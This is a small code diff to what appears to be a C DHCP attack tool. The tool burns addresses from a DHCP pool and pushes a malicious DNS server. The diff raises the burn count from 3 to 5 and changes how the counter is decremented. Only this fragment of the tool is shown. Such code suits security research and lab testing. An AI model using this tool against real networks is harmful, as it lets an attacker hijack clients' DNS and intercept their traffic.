@@ -72,7 +72,7 @@ static void _build_logger(attack_t instance, attack_args_t args) {
 static void _extract_fields(attack_t instance, attack_args_t args) {
     instance->malicious_dns = args.malicious_dns;
     instance->my_ip = args.my_ip;
-    instance->burned_ips = 3;
+    instance->burned_ips = 5;
     strcpy(instance->interface_name, args.interface_name);
     memcpy(instance->mac, args.mac, sizeof(instance->mac));
 }
@@ -87,7 +87,7 @@ static void _on_ack_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_
 
     memcpy(decline_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
 
-    if (instance->burned_ips--) {
+    if (--instance->burned_ips) {
         logger_debug(instance->logger, "Burning another IP...");
         //dhcp_client_decline(dhcp_client, decline_data);
         dhcp_client_discovery(dhcp_client, instance->mac, instance->my_ip);
